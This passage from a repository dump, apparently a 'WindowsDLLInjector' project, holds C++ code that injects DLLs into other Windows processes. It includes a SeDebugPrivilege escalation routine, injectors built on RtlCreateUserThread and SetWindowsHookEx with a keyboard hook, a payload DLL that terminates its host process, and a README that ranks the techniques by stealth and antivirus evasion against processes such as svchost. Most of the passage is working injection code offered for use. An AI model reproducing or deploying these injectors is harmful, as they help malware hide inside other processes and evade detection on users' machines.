		tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
	}
	else {
		tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED & tpPrevious.Privileges[0].Attributes);
	}

	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tpPrevious,
		cbPrevious,
		NULL,
		NULL
	);


	if (GetLastError() != ERROR_SUCCESS) return false;

	return true;
}


void DisplayError(LPCSTR szAPI) {

	LPTSTR MessageBuffer;
	DWORD dwBufferLength;

	fprintf(stderr, "%s() error!\n", szAPI);

	if (dwBufferLength = FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM,
		NULL,
		GetLastError(),
		GetSystemDefaultLangID(),
		(LPTSTR)&MessageBuffer,
		0,
		NULL
	)) {

		DWORD dwBytesWritten;

		// Output message string on stterr
		WriteFile(
			GetStdHandle(STD_ERROR_HANDLE),
			MessageBuffer,
			dwBufferLength,
			&dwBytesWritten,
			NULL
		);

		// Free the buffer alllocated by the system
		LocalFree(MessageBuffer);
	}

}

int EscalatePrivilege() {

	HANDLE hToken;
	int dwRetVal = RTN_OK;

	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken)) {

		if (GetLastError() == ERROR_NO_TOKEN) {
			if (!ImpersonateSelf(SecurityImpersonation)) return RTN_ERROR;

			if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken)) {
				DisplayError("OpenThreadToken");
				return RTN_ERROR;
			}

		}
		else {
			return RTN_ERROR;
		}
	}

	// Enable SetPrivilege()

	if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {

		DisplayError("Set Privilege");

		//close token handle
		CloseHandle(hToken);

		//indicate failure
		return RTN_ERROR;
	}

	return dwRetVal;
}
```

`Injector/src/RtlCreateUserThread.cpp`:

```cpp
#include "Injector.h"

bool RtlCreateUsreThread_type5(HANDLE hProcess, LPCSTR DllPath) {

	LPVOID LoadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

	if (!LoadLibraryAddr) {
		printf("Could note get real address of LoadLibraryA from kernel32.dll!\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("LoadLibraryA is located at real address: 0X%p\n", (void*)LoadLibraryAddr);
	Sleep(1000);

	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!pDllPath) {
		printf("Could not allocate Memory in target process\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory allocated at: 0X%p\n", (void*)pDllPath);
	Sleep(1000);

	BOOL written = WriteProcessMemory(hProcess, pDllPath, (LPVOID)DllPath, strlen(DllPath), NULL);

	if (!written) {
		printf("Could not write into the allocated memory\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory was written at address : 0x%p\n", (void*)pDllPath);
	Sleep(1000);

	HMODULE modNtDll = GetModuleHandle("ntdll.dll");

	if (!modNtDll) {
		printf("Failed to get module handle for ntdll.dll\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	pRtlCreatUserThread pfunc_RtlCreateUserThread = (pRtlCreatUserThread)GetProcAddress(modNtDll, "RtlCreateUserThread");

	if (!pfunc_RtlCreateUserThread) {
		printf("Failed to get RtlCreateThreadEx function address from ntdll.dll\n");
		printf("LastError: 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	HANDLE hThread = NULL;

	pfunc_RtlCreateUserThread(
		hProcess,
		NULL,
		0,
		0,
		0,
		0,
		LoadLibraryAddr,
		pDllPath,
		&hThread,
		NULL
	);

	if (!hThread) {

		printf("\nRtlCreateUserThreadEx failed\n");
		printf("LastError: 0X%x\n", GetLastError());

		if (VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE)) {
			printf("Memory was freed in target process\n");
			Sleep(1000);
		}
		system("PAUSE");
		return false;
	}

	printf("Thread started with RtlCreateUserThread\n");
	Sleep(1000);

	WaitForSingleObject(hThread, INFINITE);

	system("PAUSE");

	if (VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE)) {
		//VirtualFreeEx(hProc, reinterpret_cast<int*>(pDllPath) + 0X010000, 0, MEM_RELEASE);
		printf("Memory was freed in target process\n");
		Sleep(1000);
	}

	CloseHandle(hThread);

	CloseHandle(hProcess);

	return true;
}
```

`Injector/src/SetWindowsHookEx.cpp`:

```cpp
#include "Injector.h"

bool SetWindowsHookEx_type4(DWORD processId, LPCSTR dllPath) {

	HMODULE hModDll = LoadLibrary(dllPath);

	if (!hModDll) {
		printf("Error in getting module handle for %s\n", dllPath);
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	HOOKPROC procAddress = (HOOKPROC)GetProcAddress(hModDll, "HookProcedure");

	if (!procAddress) {
		printf("Error in getting hook procedure address in %s\n", dllPath);
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;

	// Take snaphsot of all running threads
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	if (hThreadSnap == INVALID_HANDLE_VALUE) {
		printf("Could not get snapshot of threads\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	// set structure size
	te32.dwSize = sizeof(THREADENTRY32);
	DWORD threadId = 0;

	if (!Thread32First(hThreadSnap, &te32)) {
		printf("Could not get first thread\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	/*
	HWND hwnd = nullptr;
	hwnd = FindWindowA(NULL, "C:\\Users\\kourosh\\source\\repos\\WindowsDLLInjector\\TargetProgramBuild\\bin\\x64\\Debug\\TargetProgram.exe");
	GetWindowThreadProcessId(hwnd, &processId);

	if (!hwnd) {
		printf("Could not find window\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}
	*/
	
	do {

		if (te32.th32OwnerProcessID == processId) {

			threadId = te32.th32ThreadID;
			printf("%d", threadId);
			HANDLE hThread = OpenThread(READ_CONTROL, FALSE, te32.th32ThreadID);

			if (hThread) {


				printf("Setting hook in thread with ID %d\n", threadId);
				HHOOK hookHandle = SetWindowsHookExA(WH_KEYBOARD, procAddress, hModDll, (DWORD)threadId);

				if (!hookHandle) {
					printf("Error in Setting Hook in thread\n");
					printf("LastError : 0X%x\n", GetLastError());
					system("PAUSE");
					return false;
				}
				else
				{
					printf("Hook Installed successfully via SetWindowsHookEx in process %d\n", processId);
					system("PAUSE");
					UnhookWindowsHookEx(hookHandle);
					return true;
				}
			}
			else {
				printf("Could not find suitable Thread\n");
				system("PAUSE");
			}
				

		}

	} while (Thread32Next(hThreadSnap, &te32));

	if (!threadId)
		printf("No Thread for use in process %d\n", processId);

	return false;


}
```

`PayloadDLL/PayloadDLL.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{A37A7D73-ECD3-4F67-8343-907881F34DA3}</ProjectGuid>
    <RootNamespace>PayloadDLL</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
    <ProjectName>PayloadDLL</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <OutDir>$(SolutionDir)PayloadDLLBuild\bin\$(Configuration)\$(Platform)\</OutDir>
    <IntDir>$(SolutionDir)PayloadDLLBuild\intermediates\$(Configuration)\$(Platform)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <OutDir>$(SolutionDir)PayloadDLLBuild\bin\$(Configuration)\$(Platform)\</OutDir>
    <IntDir>$(SolutionDir)PayloadDLLBuild\intermediates\$(Configuration)\$(Platform)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <OutDir>$(SolutionDir)PayloadDLLBuild\bin\$(Configuration)\$(Platform)\</OutDir>
    <IntDir>$(SolutionDir)PayloadDLLBuild\intermediates\$(Configuration)\$(Platform)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <OutDir>$(SolutionDir)PayloadDLLBuild\bin\$(Configuration)\$(Platform)\</OutDir>
    <IntDir>$(SolutionDir)PayloadDLLBuild\intermediates\$(Configuration)\$(Platform)\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="src\Payload.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="src\Payload.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`PayloadDLL/PayloadDLL.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="src\Payload.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="src\Payload.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`PayloadDLL/PayloadDLL.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup>
    <ShowAllFiles>true</ShowAllFiles>
  </PropertyGroup>
</Project>
```

`PayloadDLL/src/Payload.cpp`:

```cpp
#include "Payload.h"

void LogMessage(const char* message) {

	// printf("%s\n", message);

	// exit with native api
	pNtTerminateProcess pFuncNtTerminateProcess = (pNtTerminateProcess)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtTerminateProcess");

	pFuncNtTerminateProcess((NTSTATUS)0);

}

extern "C" __declspec(dllexport) void HookProcedure() {

	printf("Injected via SetWindowsHookEx");
	//MessageBox(0, "Hello I'm DLL injected inside you !!!", "SetWindowsHookEx", MB_ICONINFORMATION);

}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD ul_reason_for_call,
	LPVOID lpReserved
) {
	

	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			//MessageBox(0, "Hello I'm DLL injected inside you !!!", "DLL_PROCESS_ATTACH", MB_ICONINFORMATION);
			LogMessage("Hello I'm DLL injected inside you in DLL_PROCESS_ATTACH mode!!!");
			//exit(1);
			break;

		case DLL_THREAD_ATTACH:
			//MessageBox(0, "Hello I'm DLL injected inside you GOOGLE CHROME !!!", "DLL_THREAD_ATTACH", MB_ICONINFORMATION);
			LogMessage("Hello I'm DLL injected inside you in DLL_THREAD_ATTACH mode!!!");
			//exit(1);
			break;

		case DLL_THREAD_DETACH:
			//MessageBox(0, "Hello I'm DLL injected inside you GOOGLE CHROME !!!", "DLL_THREAD_DETACH", MB_ICONINFORMATION);
			LogMessage("Hello I'm DLL injected inside you in DLL_THRED_DETACH mode!!!");
			//exit(1);
			break;

		case DLL_PROCESS_DETACH:
			//MessageBox(0, "Hello I'm DLL injected inside you !!!", "DLL_PROCESS_DETACH", MB_ICONINFORMATION);
			LogMessage("Hello I'm DLL injected inside you in DLL_PROCESS_DETACH mode!!!");
			//exit(1);
			break;
	}

	return TRUE;
}
```

`PayloadDLL/src/Payload.h`:

```h
#pragma once

#include <stdio.h>
#include <Windows.h>

__declspec(dllexport) void LogMessage(const char* message);
extern "C" __declspec(dllexport) void HookProcedure();

typedef NTSTATUS (WINAPI* pNtTerminateProcess)(

	IN	NTSTATUS	ExitStatus

);
```

`README.md`:

```md
# WindowsDLLInjector
Some DLL Injection techniques written in C++ for both 32bit and 64bit windows OS

# Intro
There are several ways for injecting a dll or generally a process in another target process\
It has many advantages such as accessing that process memory address and extending it's functionality\
In abuse cases it can be used to hide malicious activity in another process and somehow bypass antivirus detection


each one has it's pros and cons

Here we have implemented 5/7 techniques

- [x] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CreateRemoteThread (windows Win32 API through windows.h)
- [x] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NtCreateThread (windows native API through ntdll.dll)
- [x] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;QueueUserAPC
- [x] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SetWindowsHookEx
- [x] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RtlCreateUserThread (windows native API through ntdll.dll)
- [ ] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SetThreadContext
- [ ] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ReflectiveDllInjection

# CreateRemoteThread
Maybe it's the first google search result for dll injection\
This API is mapped to NtCreateThread native API 
Very well documented and easy to code!

Pros.\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Easy to implement (maybe just 5 lines of code)\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; well documented on internet

Cons.\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Easy to detect\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; not possible on all processes (specially windows NT native processes)

# NtCreateThread
Acually not as easy as CreateRemoteThread method\
It needs some header definitin and function pointer casting to get the address of NtCreateThread in ntdll.dll\
A little hard to implement but very effective against windows native system processes

Pros.\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Can be used for windows native NT processes (like : svchost, smss, ...)\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Harder to be detected

Cons.\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; A little hard to implement and debug\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; no official documentation

# QueueUserAPC
This method is about hijacking and using a thread in target process\
As documented in msdn, the function call QueueUserAPC() adds user-mode asychronous procedure call(APC) object to the APC queue of specified thread\
Actually we don't create our own thread and just use the target process's threads for loading our dll into the process address space\
Notice that to make this method work, The remote target thread should be in suspended state and with alertable flag (Example SleepEx() in TargetProgram.cpp)

Pros.\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; No need for creating new Threads\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; It adds some stealthy abilities for injection (cause no new thead would be created)

Cons.\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Not always possible on all threads (just suspended threads with alertable flag)

# SetWindowsHookEx
This method actually is for setting Windows Hook for specific events like keyboard or mouse event\
But since the hook procedure should be in form of exported function in a dll file in the target process,\
This makes it possible to use it as a dll injection method\
This one is kinda different one because neither thread nor APC is created but A hook is set in target process for a specific thread

Pros.\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; No need for creating new Threads or APC call\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Easy to use spcially with thread ID equals 0 :)

Cons.\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Too suspicious for antivirus detection because of using hooks


# RtlCreatUserThread
Same as NtCreateThread with some possible wrapping

Pros.\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Can be used for windows native NT processes (like : svchost, smss, ...)\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Harder to be detected

Cons.\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; A little hard to implement and debug\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; no official documentation


<br><br>
# Credit
Many thanks for **fdiskyou** and his **InjectAllTheThings** (nice name) repository\
His Repo : https://github.com/fdiskyou/injectAllTheThings \
His website : http://deniable.org

```

`TargetProgram/TargetProgram.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{15863529-2853-4ABE-815E-F4A8F13B8FC4}</ProjectGuid>
    <RootNamespace>TargetProgram</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <OutDir>$(SolutionDir)TargetProgramBuild\bin\$(Configuration)\$(Platform)\</OutDir>
    <IntDir>$(SolutionDir)TargetProgramBuild\intermediates\$(Configuration)\$(Platform)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <OutDir>$(SolutionDir)TargetProgramBuild\bin\$(Configuration)\$(Platform)\</OutDir>
    <IntDir>$(SolutionDir)TargetProgramBuild\intermediates\$(Configuration)\$(Platform)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <OutDir>$(SolutionDir)TargetProgramBuild\bin\$(Configuration)\$(Platform)\</OutDir>
    <IntDir>$(SolutionDir)TargetProgramBuild\intermediates\$(Configuration)\$(Platform)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <OutDir>$(SolutionDir)TargetProgramBuild\bin\$(Configuration)\$(Platform)\</OutDir>
    <IntDir>$(SolutionDir)TargetProgramBuild\intermediates\$(Configuration)\$(Platform)\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="src\Target.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`TargetProgram/TargetProgram.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
